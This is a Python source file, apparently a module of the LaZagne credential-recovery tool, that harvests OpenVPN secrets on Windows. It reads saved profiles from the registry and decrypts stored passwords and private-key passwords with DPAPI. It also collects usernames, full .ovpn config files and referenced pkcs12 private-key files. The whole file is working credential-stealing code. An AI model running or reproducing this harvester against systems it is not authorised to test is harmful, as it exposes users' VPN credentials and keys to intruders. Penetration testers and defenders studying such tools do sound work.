try:
    import _winreg as winreg
except ImportError:
    import winreg

from lazagne.config.winstructure import *
from lazagne.config.module_info import ModuleInfo
from lazagne.config.winstructure import Win32CryptUnprotectData
from lazagne.config.constant import constant

import os

class OpenVPN(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, name='openvpn', category='sysadmin', registry_used=True, winapi_used=True)

    def check_openvpn_installed(self):
        try:
            key = OpenKey(HKEY_CURRENT_USER, 'Software\\OpenVPN-GUI\\Configs')
            return key
        except Exception as e:
            self.debug(str(e))
            return False

    def decrypt_password(self, encrypted_password, entropy):
        result_bytes = Win32CryptUnprotectData(encrypted_password,
                                               entropy=entropy,
                                               is_current_user=constant.is_current_user,
                                               user_dpapi=constant.user_dpapi)
        return result_bytes.decode("utf16")

    def get_credentials(self, key):
        pwd_found = []
        num_profiles = winreg.QueryInfoKey(key)[0]
        for n in range(num_profiles):
            name_skey = winreg.EnumKey(key, n)
            skey = OpenKey(key, name_skey)
            values = {'Profile': name_skey}
            try:
                encrypted_password = winreg.QueryValueEx(skey, "auth-data")[0]
                entropy = winreg.QueryValueEx(skey, "entropy")[0][:-1]
                password = self.decrypt_password(encrypted_password, entropy)
                values['Password'] = password
                values['Username'] = winreg.QueryValueEx(skey, "username")[0].decode("utf16")
                #  Try to find out private key password.
                #  It doesn't have to exist.
                try:
                    encrypted_private_key_password = winreg.QueryValueEx(skey, "key-data")[0]
                    values['PrivateKeyPassword'] = self.decrypt_password(encrypted_private_key_password, entropy)
                except Exception as e:
                    pass

                values.update(self.collect_extra_data_for_profile(name_skey))
            except Exception as e:
                self.debug(str(e))
            pwd_found.append(values)
            winreg.CloseKey(skey)
        winreg.CloseKey(key)

        return pwd_found

    @staticmethod
    def get_vpn_config_file_path(profile_name):
        possible_openvpn_config_directories = [
            'C:\\Program Files\\OpenVPN\\config',
            'C:\\Program Files (x86)\\OpenVPN\\config',
            os.path.join(constant.profile['USERPROFILE'], 'OpenVPN', "config")
        ]

        #  It needs to do a recursive search in directories `possible_openvpn_config_directories` to find config file for `profile_name`
        #  I do not want to make this function as a method because I expect this is the only usage of it
        def search_ovpn_files_in_directory_recursively(directory):
            try:
                for item in os.listdir(directory):
                    item_path = os.path.join(directory, item)
                    if os.path.isdir(item_path):
                        yield from search_ovpn_files_in_directory_recursively(item_path)

                    elif os.path.isfile(item_path) and item.endswith(".ovpn"):
                        yield item_path
            except Exception:
                pass

        def search_all_ovpn_files():
            for directory in possible_openvpn_config_directories:
                yield from search_ovpn_files_in_directory_recursively(directory=directory)

        for some_openvpn_config_file in search_all_ovpn_files():
            if os.path.basename(some_openvpn_config_file) == "%s.ovpn" % profile_name:
                return some_openvpn_config_file

    def collect_extra_data_for_profile(self, profile_name):
        result = dict()
        config_file = self.get_vpn_config_file_path(profile_name)
        if not config_file:
            return result

        with open(config_file, "r") as r:
            profile_config = r.read()
            #  Config file is multiline. So in purpose to achive more readable result it wrapped around with some prefix and postfix
            result['Config ((%s))' % config_file] = "-----START_CONFIG_FILE-----\n%s\n-----END_CONFIG_FILE-----" % (
                profile_config)

        #  Do a simple config file parse to find out private key
        for line in profile_config.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                parameter, value = line.split(maxsplit=1)
            except Exception:
                continue

            #  TODO: add more parameters to retrieve
            if parameter in ["pkcs12", ]:
                try:
                    with open(value, 'rb') as r:
                        file_content = r.read()
                        #  pkcs12_key is binary data. It should to do something to make result more readable
                except Exception as e:
                    file_content = str(e)

                result["%s file content (%s)" % (parameter, value)] = file_content

        return result

    def run(self):
        openvpn_key = self.check_openvpn_installed()
        if openvpn_key:
            results = self.get_credentials(openvpn_key)
            if results:
                return results
